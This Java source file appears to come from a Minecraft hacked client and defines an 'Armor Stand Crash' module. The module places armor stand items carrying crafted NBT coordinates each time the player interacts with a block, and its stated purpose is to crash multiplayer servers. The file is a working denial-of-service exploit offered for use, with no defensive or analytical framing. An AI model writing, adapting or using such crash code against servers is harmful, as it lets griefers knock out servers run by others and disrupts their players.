package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.packets.PacketEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;

public class ArmorStandCrash extends Module {
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> autoDisable;
    private int xChunk;
    private int zChunk;

    public ArmorStandCrash() {
        super(Categories.Crash, Items.ARMOR_STAND, "Armor Stand Crash", "Attempts to crash the server using armor stands.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.autoDisable = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder()).name("auto-disable")).description("Disables module on kick.")).defaultValue(true)).build());
    }

    public boolean onActivate() {
        if(!mc.isInSingleplayer()) {
            if (this.mc.player != null && !this.mc.player.getAbilities().creativeMode) {
                this.error("You must be in creative mode to use this.");
                this.toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
        return false;
    }

    @EventHandler
    private void onPacketSend(PacketEvent.Send event) {
        if (event.packet instanceof PlayerInteractBlockC2SPacket) {
            ItemStack stack = new ItemStack(Items.ARMOR_STAND);
            NbtCompound tag = new NbtCompound();
            tag.put("SleepingX", NbtInt.of(this.xChunk << 4));
            tag.put("SleepingY", NbtInt.of(0));
            tag.put("SleepingZ", NbtInt.of(this.zChunk * 10 << 4));
            stack.setSubNbt("EntityTag", tag);
            if (this.mc.interactionManager != null) {
                this.mc.interactionManager.clickCreativeStack(stack, 36);
            }
            this.xChunk += 10;
            ++this.zChunk;
        }

    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if ((Boolean)this.autoDisable.get()) {
            this.toggle();
        }

    }
}
